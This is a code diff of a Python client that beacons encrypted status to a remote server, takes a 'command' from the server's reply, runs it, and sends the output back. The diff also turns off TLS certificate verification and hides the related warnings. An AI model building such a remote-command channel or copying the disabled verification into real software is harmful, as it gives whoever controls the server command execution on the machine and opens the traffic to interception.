@@ -4,17 +4,20 @@ import platform
 import getpass
 import requests
 import json
+import subprocess
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 from cryptography.fernet import Fernet
 
 # =========================
 # CONFIG
 # =========================
-SERVER_URL = "http://SERVER_IP:5000"
+SERVER_URL = "https://SERVER_URL:5000"
 
-AUTH_TOKEN = "supersecretkey"
+AUTH_TOKEN = "SUPERSECRETKEY"
 
-FERNET_KEY = b"PASTE_YOUR_FERNET_KEY_HERE"
+FERNET_KEY = b"GENERATE_A_NEW_KEY"
 
 cipher = Fernet(FERNET_KEY)
 
@@ -54,7 +57,8 @@ def beacon():
     response = requests.post(
         SERVER_URL + "/status",
         data=encrypted_payload,
-        headers=headers
+        headers=headers,
+	verify=False
     )
 
     if response.status_code != 200:
@@ -66,7 +70,10 @@ def beacon():
     task = decrypted_response.get("task")
 
     if task:
-        execute_task(task)
+        command = task.get("command")
+    
+        if command:
+        	execute_task(command)
 
 # =========================
 # SAFE TASK EXECUTION
@@ -110,7 +117,8 @@ def send_result(output):
     response = requests.post(
         SERVER_URL + "/push",
         data=encrypted_payload,
-        headers=headers
+        headers=headers,
+	verify=False
     )
 
     print(f"[+] Result Sent -> {response.status_code}")
